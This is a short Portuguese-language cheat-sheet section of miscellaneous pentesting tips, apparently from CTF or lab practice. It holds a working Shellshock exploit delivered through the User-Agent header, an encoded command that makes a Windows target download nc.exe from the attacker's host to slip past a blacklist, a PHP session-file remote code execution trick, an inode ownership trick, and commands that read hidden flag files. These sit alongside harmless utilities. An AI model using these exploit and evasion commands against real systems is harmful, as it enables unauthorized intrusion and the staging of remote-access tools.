# 12. Diversos / Dicas

```bash
# stderr→stdout (shellshock sai por stderr):
curl -H "User-Agent: () { :; }; /bin/bash -c 'echo a; nc -h 2>&1; echo z;'" http://$IP/cgi-bin/admin.cgi -s
# limpar carriage return de scripts:
sed -i -e 's/\r$//' script.sh
# esteganografia:
steghide extract -sf arquivo.png
# Alternate Data Streams (Windows):
dir /R
powershell Get-Content -Path hm.txt -Stream root.txt
more < hm.txt:root.txt:$DATA
# arquivos ocultos:
dir -Force                # windows
find / -name ".*" -type f -path "/home/*" 2>/dev/null   # linux
# rodar comandos bash a partir do powershell (WSL):
bash -c "command"
# JWT (express) — pegar e usar o token:
curl -s -X POST http://$IP:3000/login -d "username=admin&password=pass" | jq
curl -s http://$IP:3000/ -H 'Authorization: Bearer <token>' | jq
# Truque de INODE: se você é dono do diretório mas não do arquivo, mova-o e crie outro com mesmo nome
# Arquivo de sessão PHP (Windows): C:\Windows\TEMP\sess_<cookie>  (username com <?=...?> → RCE)
# Base64/UTF-16LE p/ burlar blacklist:
echo "wget http://<kali>/nc.exe -o C:\\Windows\\TEMP\\nc.exe" | iconv -t UTF-16LE | base64
# unzip via python:
python3 -c "from zipfile import PyZipFile; PyZipFile('f.zip').extractall()"
```
